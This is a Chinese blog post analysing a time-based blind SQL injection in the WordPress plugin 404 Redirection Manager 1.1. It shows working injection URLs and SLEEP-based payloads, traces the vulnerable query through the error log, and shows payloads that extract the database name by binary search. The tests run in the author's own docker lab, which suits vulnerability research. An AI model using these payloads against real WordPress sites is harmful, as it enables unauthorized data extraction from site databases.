---
layout: post
title: WordPress插件:404 Redirection Manager 1.1 SQL注入
categories: [漏洞]
tags: [WordPress,SQL Injection]
fullview: false
comments: true
---
发现这个问题的经过是这样的，原本想着上午逛逛exploit db 看看有没有什么漏洞可以自己搭环境可以搞一搞试试的，逛了一圈发现WordPress的404 Redirection Manager 1.0插件有个注入，提交的时间已经过去很多天了。本着观摩一下poc的心态点开看了看，发现WordPress的插件库里依旧还有这款插件，于是乎下载下来，用docker搭建了一个环境。【docker真好用...

下载下来才发现，这个插件已经更新到了1.1版本，就是在这个漏洞提交后不几天更新的，心一下子就凉了一半，心想着这么快就修了。但是好奇心驱使我还是把环境搭好了，用1.0版本的poc尝试了一下，发现依旧有用，虚惊一场，总之先搞了再说。

首先说下搭建的测试环境:

服务器：Apache
数据库类型：MySQL
数据库版本：5.7.15 
数据库客户端版本：libmysql - 5.5.52
PHP扩展:mysqli 
PHP版本：5.6.26-0+deb8u1
phpMyAdmin版本信息：4.4.14
WordPress版本：4.3.6

先做准备工作，在docker上部署的这个WordPress默认的链接形式是这样的：

<code>http://monburan-wordpress-test.daoapp.io/2016/12/22/sample-post/</code>

这里要将WordPress的链接设置成默认的，像这样：

<code>http://monburan-wordpress-test.daoapp.io/?p=123</code>

首先用1.0版本的poc测试一下：

<code>http://monburan-wordpress-test.daoapp.io/?p=1') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL</code>

‘字面上’的注入很好理解，利用<code>sleep()</code>进行延时注入，当<code>'a'='a'</code>结果为<code>True</code>，则取0，<code>5-0=5</code>，执行<code>sleep(5)</code>。

为了更好的分析这个漏洞产生的过程，我插入了一条可以触发数据库错误的语句<code>') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'</code>(这里多了一个<code>'</code>),借助后台日志，我尝试着找到了这段注入执行的语句。

<code>
[Thu Dec 22 06:55:20.702722 2016] [:error] [pid 187] [client 10.10.79.136:43543] WordPress\xe6\x95\xb0\xe6\x8d\xae\xe5\xba\x93\xe6\x9f\xa5\xe8\xaf\xa2 select * from wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex<>'' and ('/?p=1') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'' regexp regex or '/?p=1') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'/' regexp regex ) order by LENGTH(regex) desc \xe6\x97\xb6\xe5\x8f\x91\xe7\x94\x9fYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?p=1') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'' at line 1\xe9\x94\x99\xe8\xaf\xaf\xef\xbc\x8c\xe8\xbf\x99\xe6\x98\xaf\xe7\x94\xb1require('wp-blog-header.php'), wp, WP->main, do_action_ref_array, call_user_func_array, SR_redirect_manager::redirect\xe6\x9f\xa5\xe8\xaf\xa2\xe7\x9a\x84\xe3\x80\x82
</code>

执行的语句是这样的：

<code>select * from $table_name where enabled=1 and cat='link' and blog='" . get_current_blog_id() . "' and regex<>'' and $permalink_regex_options order by LENGTH(regex) desc </code>

<code>$permalink_regex_options</code>指向了<code>('$permalink' regexp regex or '$permalink_alternative'  regexp regex )</code>。

<code>$permalink</code> 和 <code>$permalink_alternative</code> 则分别指向了 <code>get_permalink()</code>，<code>get_alternative_permalink()</code>这两个获取固定链接的函数。

综上，可以整理出完整在数据库中执行的语句：

<code>
select * from wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex<>'' and ('/?p=1') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL' regexp regex or '/?p=1') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL' regexp regex ) order by LENGTH(regex) desc
</code>

可以发现，这里<code>sleep</code>执行了两次，执行的时间应该在10秒以上。跑一下，成功了，时间也没问题。
![pic]()

这样只算是验证了这个漏洞，那看看如何再将这个poc更加深层次的利用。

在拿到目标数据库名字之前，需要知道这个数据库名多长，MySQL数据库的名字最长为64。

构造下面的注入语句：

<code>')
AND (SELECT * FROM (SELECT(SLEEP(5-(IF(LENGTH(database())>32,0,5)))))abc) AND ('SQL'='SQL</code>

这里使用二分法来解决问题，每次将数字减半。就上面的语句来说，如果回显时间大于10则认定数据库长度在64和32之间，否则就取16和32这个区间，以此类推，即可推导出数据库名的长度。

接下来就是爆库名了，通常数据库的命名都是由字母与下划线组成，这样的话可以用和上面相似的思路去爆破。
大小写和下划线的ascii码在64和123区间内，取中间值然后再逐个判断。

<code>')
AND (SELECT * FROM (SELECT(SLEEP(5-(IF(ascii(substr((select database()),X,1))>Y,0,5)))))abc) AND ('SQL'='SQL</code>

这里的X就是字母的位数，Y则是字母的ascii码，每次判断成功则X+1。












